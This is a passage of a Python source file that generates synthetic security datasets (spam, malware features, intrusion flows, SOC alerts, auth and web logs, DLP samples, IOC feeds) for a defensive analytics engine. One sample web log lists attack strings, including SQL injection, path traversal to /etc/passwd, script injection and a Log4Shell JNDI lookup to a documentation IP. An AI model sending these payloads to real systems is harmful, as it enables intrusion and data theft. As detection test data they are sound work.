              "URGENT: your loan is approved, no credit check, earn $5000 per week working from home", "Cheap pills online, buy now with 90% discount, no prescription",
              "Dear beneficiary, transfer of $4,500,000 awaits you. Reply with your bank details", "Double your bitcoin investment in 24 hours, guaranteed 100% profit"]
    ham_t = ["Hi, are we still meeting for lunch tomorrow at noon?", "Please find the quarterly report attached; let me know if numbers look right.",
             "Reminder: team stand-up moved to 10:30 in room 4.", "Thanks for your help yesterday, the deployment went fine.", "Can you send me the address of the venue?",
             "I'll be late, the bus is delayed. Start without me."]
    rows = [[(R.choice(spam_t) if (sp := R.random() < .3) else R.choice(ham_t)) + (" " + R.choice(["", "ok", "thx", "!!"])), "spam" if sp else "ham"] for _ in range(700)]
    wcsv("spam", "spam_sample.csv", ["text", "label"], rows)

    rows = []
    for _ in range(900):
        mal = R.random() < .4
        if mal:
            e = R.uniform(6.8, 7.9)
            rows.append([R.randint(20000, 3000000), round(e, 2), round(min(8, e + R.uniform(0, .6)), 2), 1, R.randint(3, 9), R.choice([0, 0, 1, 2]), R.choice([0, 1, 2]),
                         R.randint(1, 4), R.randint(2, 20), R.choice([0, 0, 1]), R.randint(0, 5), "malware"])
        else:
            e = R.uniform(4.5, 6.6)
            rows.append([R.randint(20000, 9000000), round(e, 2), round(min(8, e + R.uniform(0, 1.0)), 2), 1, R.randint(4, 12), 0, 0, R.choice([0, 0, 1]),
                         R.randint(0, 4), 0, R.randint(0, 3), "benign"])
    wcsv("malware", "malware_features_sample.csv", ["size", "entropy", "max_block_entropy", "is_pe", "n_sections", "rwx_sections", "high_entropy_sections",
                                                       "susp_api_groups", "susp_api_hits", "script_markers", "url_count", "label"], rows)

    rows = []
    for _ in range(1400):
        c = R.random()
        if c < .65:
            rows.append([R.randint(0, 300), R.choice(["tcp", "udp"]), R.choice(["http", "ftp_data", "smtp", "domain_u", "private"]), "SF", R.randint(100, 5000), R.randint(100, 20000),
                         R.randint(1, 20), 0.0, 0, 0, "normal"])
        elif c < .85:
            rows.append([0, "tcp", R.choice(["private", "http", "telnet"]), R.choice(["S0", "REJ", "RSTO"]), 0, 0, R.randint(150, 511), round(R.uniform(.85, 1), 2), 0, 0, "dos"])
        elif c < .95:
            rows.append([0, "tcp", R.choice(["private", "other", "ftp"]), R.choice(["REJ", "RSTR", "SH"]), R.randint(0, 60), 0, R.randint(60, 250), round(R.uniform(.3, .9), 2), 0, 0, "probe"])
        else:
            rows.append([R.randint(1, 300), "tcp", R.choice(["telnet", "ftp", "ssh"]), "SF", R.randint(100, 900), R.randint(100, 900), R.randint(1, 5), 0.0, R.randint(3, 6), R.choice([0, 1]), "r2l"])
    wcsv("intrusion", "intrusion_flows_sample.csv", ["duration", "protocol_type", "service", "flag", "src_bytes", "dst_bytes", "count", "serror_rate", "num_failed_logins", "root_shell", "label"], rows)

    al = {"malware": ["Trojan detected on {h}", "Ransomware behaviour blocked by EDR on {h}", "Cobalt Strike beacon signature on {h}"],
          "phishing": ["Suspicious email reported by user: credential harvest link", "Spoofed sender impersonating CEO (BEC)", "Malicious link clicked from phishing email"],
          "brute_force": ["Multiple failed login attempts for admin from {ip}", "Password spray detected against VPN", "Account lockout threshold exceeded on {h}"],
          "intrusion": ["SQL injection attempt against web app {h}", "Exploit attempt CVE-2021-44228 detected", "Web shell uploaded to {h}"],
          "data_exfiltration": ["Large upload to cloud storage from {h}", "DLP: sensitive data sent to personal email", "Unusual transfer of 8GB to external IP {ip}"],
          "reconnaissance": ["Port scan detected from {ip}", "Nmap enumeration of subnet from {ip}", "Host sweep on port 445 from {ip}"],
          "benign": ["Scheduled vulnerability scanner activity from {ip}", "Informational: health check heartbeat on {h}", "Test alert generated by SOC"]}
    rows = []
    for _ in range(420):
        cat = R.choice(list(al))
        rows.append([R.choice(al[cat]).format(h=R.choice(["dc01", "web-prod-2", "ws-114", "db-finance"]), ip=f"203.0.113.{R.randint(2, 250)}"), cat])
    wcsv("alerts", "alerts_sample.csv", ["description", "label"], rows)

    users = [f"user{i}" for i in range(1, 41)]
    mers = [f"m{i}" for i in range(1, 30)]
    t0 = 1_735_689_600
    rows = []
    for i in range(4200):
        u = R.choice(users)
        fr = R.random() < .015
        ts = t0 + i * 90 + R.randint(0, 80)
        if fr:
            rows.append([ts, u, round(R.uniform(900, 9000), 2), f"new{R.randint(1, 5)}", R.choice(["RU", "NG", "BR"]), f"dev_x{R.randint(1, 99)}", 1])
        else:
            rows.append([ts, u, round(R.lognormvariate(3.2, .6), 2), R.choice(mers), "RW", f"dev_{u}", 0])
    wcsv("fraud", "fraud_transactions_sample.csv", ["timestamp", "user", "amount", "merchant", "country", "device", "is_fraud"], rows)

    rows = []
    t = t0
    cn = {"alice": "RW", "bob": "RW", "carol": "KE", "dave": "UG", "erin": "RW", "frank": "RW"}
    for _ in range(1500):
        t += R.randint(20, 120)
        u = R.choice(list(cn))
        rows.append([t, u, f"10.0.1.{10 + list(cn).index(u)}", cn[u], R.choice(["true"] * 9 + ["false"]), "login"])
    bt = t + 300
    for i in range(30):                                          # brute force then success
        rows.append([bt + i * 4, "admin", "198.51.100.23", "CN", "false", "login"])
    rows.append([bt + 140, "admin", "198.51.100.23", "CN", "true", "login"])
    for i in range(24):                                          # spraying
        rows.append([bt + 400 + i * 3, f"user{i}", "198.51.100.77", "RU", "false", "login"])
    for i in range(20):                                          # stuffing
        rows.append([bt + 700 + i, f"acct{i}", "192.0.2.50", "RU", "false", "login"])
    rows.append([bt + 900, "alice", "10.0.1.5", "RW", "true", "login"])
    rows.append([bt + 1500, "alice", "185.220.101.4", "DE", "true", "login"])   # impossible travel
    rows.append([bt + 2000, "bob", "10.0.1.9", "RW", "true", "added to group Domain Admins"])
    rows.sort(key=lambda r: r[0])
    wcsv("password", "auth_log_sample.csv", ["timestamp", "user", "src_ip", "country", "success", "action"], rows)
    out["iam"] = out["password"]

    rows = []
    t = t0
    for _ in range(2600):
        t += R.randint(60, 900)
        u = R.choice(["ann", "ben", "cy", "di", "eli"])
        h = (t // 3600) % 24
        if not 8 <= h < 18:
            t += (8 - h) % 24 * 3600 // 2
        rows.append([t, u, R.choice(["open", "edit", "save", "read"]), f"/docs/{u}/file{R.randint(1, 30)}.docx", int(R.lognormvariate(10, .5)), f"laptop-{u}", "RW"])
    rows.append([t + 5000, "ben", "download", "/finance/payroll_2026.xlsx", 900_000_000, "laptop-ben", "RW"])
    rows.append([t + 9000 + 3 * 3600, "di", "login", "/hr/salary_db", 5_000, "unknown-pc", "RO"])
    wcsv("uba", "uba_activity_sample.csv", ["timestamp", "user", "action", "resource", "bytes", "device", "country"], rows)

    rows = []
    t = t0
    for _ in range(900):
        t += R.randint(1, 5)
        rows.append([t, f"10.0.0.{R.randint(2, 40)}", f"93.184.{R.randint(0, 5)}.{R.randint(1, 200)}", R.choice([80, 443, 443, 53, 8080]), "tcp", R.randint(300, 9000), R.randint(500, 50000)])
    for p in range(1, 90):                                       # port scan
        rows.append([t + p, "10.0.0.66", "10.0.0.5", p * 7, "tcp", 60, 0])
    for i in range(24):                                          # beacon
        rows.append([t + i * 60 + R.choice([0, 1]), "10.0.0.23", "203.0.113.99", 443, "tcp", 220, 180])
    for i in range(8):                                           # exfil
        rows.append([t + 100 + i, "10.0.0.31", "198.51.100.9", 443, "tcp", 30_000_000, 2000])
    rows += [[t + 300 + i, "10.0.0.44", f"10.0.1.{i}", 445, "tcp", 900, 600] for i in range(1, 15)]
    wcsv("network", "netflows_sample.csv", ["ts", "src_ip", "dst_ip", "dst_port", "proto", "bytes_out", "bytes_in"], rows)

    L = []
    base = datetime.datetime(2026, 5, 4, 8, 0, 0, tzinfo=UTC)
    for i in range(600):
        ts = (base + datetime.timedelta(seconds=i * 7)).strftime("%d/%b/%Y:%H:%M:%S +0000")
        L.append(f'10.0.0.{R.randint(2, 30)} - - [{ts}] "GET /{R.choice(["index.html", "about", "static/app.js", "api/items"])} HTTP/1.1" 200 {R.randint(300, 9000)} "-" "Mozilla/5.0"')
    for q in ["/search?q=1' OR '1'='1", "/item?id=1 UNION SELECT user,pass FROM users--", "/download?f=../../../../etc/passwd", "/?x=<script>alert(1)</script>",
              "/cgi-bin/x.sh", "/login?u=${jndi:ldap://203.0.113.5/a}"]:
        L.append(f'203.0.113.7 - - [{base.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {q} HTTP/1.1" 404 120 "-" "sqlmap/1.7"')
    for i in range(14):
        L.append(f"May  4 09:{i:02d}:11 srv1 sshd[2210]: Failed password for root from 198.51.100.23 port {40000 + i} ssh2")
    L.append("May  4 09:20:41 srv1 sshd[2301]: Accepted password for root from 198.51.100.23 port 40222 ssh2")
    L.append("May  4 09:25:00 srv1 kernel: Out of memory: kill process 4411 (java) segfault")
    with open(os.path.join(folder, "server_sample.log"), "w") as f:
        f.write("\n".join(L) + "\n")
    out["logs"] = "server_sample.log"
    out["monitor"] = "server_sample.log"

    wcsv("vuln", "inventory_sample.csv", ["host", "product", "version", "port", "exposure", "criticality"],
         [["web-01", "log4j-core", "2.14.1", 8080, "internet", 5], ["db-02", "openssl", "1.0.1f", 443, "internal", 4], ["bastion", "openssh", "9.6p1", 22, "internet", 5],
          ["app-03", "spring-framework", "5.3.17", 8080, "internal", 3], ["cache-01", "redis", "6.2", 6379, "internet", 3], ["ws-07", "curl", "8.5.0", "", "internal", 1],
          ["legacy", "telnetd", "1.0", 23, "internal", 2], ["build-1", "xz", "5.6.1", "", "internal", 3]])
    wcsv("risk", "assets_sample.csv", ["asset", "criticality", "owner"], [["10.0.0.5", 5, "infra"], ["admin", 5, "iam"], ["10.0.0.66", 2, "lab"], ["web-01", 5, "web team"], ["bob", 4, "finance"]])

    docs = [["Invoice for card 4111 1111 1111 1111 exp 12/29 cvv 123", "sensitive"], ["AWS key AKIAABCDEFGHIJKLMNOP secret in config", "sensitive"],
            ["Employee SSN 123-45-6789 and salary details", "sensitive"], ["password=Sup3rS3cret! for the db", "sensitive"],
            ["Lunch menu for Friday: pasta or salad", "ok"], ["Meeting agenda: roadmap review and hiring", "ok"], ["The weather will be sunny this weekend", "ok"]]
    wcsv("dlp", "dlp_docs_sample.csv", ["text", "label"], [R.choice(docs) for _ in range(200)])

    rows = []
    for i in range(24 * 21):
        h = i % 24
        base_v = 6 + 5 * math.sin((h - 6) / 24 * 2 * math.pi) + i * 0.02 + R.gauss(0, 1.2)
        rows.append([t0 + i * 3600, max(0, int(base_v + (18 if i > 24 * 20 else 0)))])
    wcsv("predict", "alert_volume_sample.csv", ["timestamp", "count"], rows)

    rows = [[round(R.gauss(50, 5), 2), round(R.gauss(200, 20), 2), R.choice(["a", "b", "c"])] for _ in range(800)]
    rows += [[140, 20, "z"], [-30, 600, "a"], [52, 900, "b"]]
    wcsv("anomaly", "anomaly_sample.csv", ["cpu", "memory", "tier"], rows)

    wcsv("intel", "ioc_feed_sample.csv", ["type", "value", "confidence", "tags"],
         [["ipv4", "203.0.113.99", 80, "c2"], ["domain", "evil-login.example.tk", 75, "phishing"], ["sha256", "a" * 64, 90, "malware"]])
    out["response"] = out["alerts"]
    return out


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="CryptoSec AI engine (headless)")
    ap.add_argument("--home", default=None)
    ap.add_argument("--demo-data", metavar="DIR", help="write synthetic demo datasets to DIR")
    ap.add_argument("--serve", action="store_true", help="run the REST API (127.0.0.1)")
    ap.add_argument("--port", type=int, default=8765)
    a = ap.parse_args()
    if a.demo_data:
        print(json.dumps(generate_demo_data(a.demo_data), indent=1))
    if a.serve:
        hub = AIHub(a.home)
        srv = ApiServer(hub)
        print(f"API on http://127.0.0.1:{srv.start('127.0.0.1', a.port)}/api/v1/docs\nAPI key: {hub.api_key}")
        try:
            while True:
                time.sleep(3600)
        except KeyboardInterrupt:
            srv.stop()
            hub.shutdown()
